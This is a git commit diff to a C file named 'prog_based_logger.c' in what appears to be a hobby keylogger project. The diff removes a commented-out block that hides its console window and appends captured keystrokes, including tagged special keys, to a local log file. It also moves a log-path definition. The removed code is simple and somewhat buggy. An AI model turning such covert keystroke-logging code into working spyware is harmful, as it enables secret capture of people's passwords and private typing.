cad5ce1a840b706d96352a7f3caf33386e20366b
Grig Hakobyan <45214309+AdarkSt@users.noreply.github.com>
2023-12-10 22:17:54 +0400

    Update prog_based_logger.c

--- prog_based_logger.c
+++ prog_based_logger.c
@@ -1,82 +1,9 @@
-// #include <stdio.h>
-// #include <conio.h>
-// #include <windows.h>
-// #include <time.h>
-
-// #define PATH "C:/Users/User/Desktop/Linux/keyl/data.txt" // The path to the log file
-
-// int main(){
-//     char capture;
-//     FILE *file;
-
-//     // Time stuff.
-//     time_t t;
-//     t = time(NULL);
-//     // Hide the window
-//     HWND window;
-//     AllocConsole();
-//     window=FindWindowA("ConsoleWindowClass",NULL);
-//     ShowWindow(window,0);
-
-//     file = fopen(PATH, "a+");
-
-//     while(1)
-//     {
-//        // Sleep(20); // To make sure this program doesn't steal all resources.
-//         if (kbhit())
-//         {
-//             fprintf(stderr, "%s", kbhit());
-//             capture = getch();
-//             fprintf(stderr, "%s", "capture");
-
-//             // Just add in some helper strings here to the file, feel free to modify these to your needs.
-//             switch ((int)capture){
-//                 case ' ': // Space key...obviously.
-//                     fprintf(file, " ");
-//                     break;
-//                 case 0x09: // Tab key.
-//                     fprintf(file, "[TAB]");
-//                     break;
-//                 case 0x0D: // Enter key.
-//                     fprintf(file, "[ENTER]");
-//                     break;
-//                 case 0x1B: // Escape key.
-//                     fprintf(file, "[ESC]");
-//                     break;
-//                 case 0x08: // Backspace key.
-//                     fprintf(file, "[BACKSPACE]");
-//                     break;
-//                 default:
-//                     fputc(capture,file); // Put any other inputted key into the file.
-//             }
-
-//             if ( (int) capture == 27 ){  // The escape key. You can change this to anything you want.
-//                 fclose(file);
-//                 return 0;
-//             }
-//         }else{
-
-//         }
-//     }
-// }
-
-// #include <stdio.h>
-// #include <conio.h>
- 
-// int main()
-// {
-//     while (!kbhit()){
-//         printf("Press a key\n");
-//     }
-    
-//     return 0;
-// }
-
-#define PATH "C:/Users/User/Desktop/Linux/keyl/data.txt" // The path to the log file
-
 #include <stdio.h>   
 #include <conio.h>   
 #include <windows.h>
+
+#define PATH "C:/Users/User/Desktop/Linux/keyl/data.txt" // The path to the log file
+
 
 int main()  
 {  
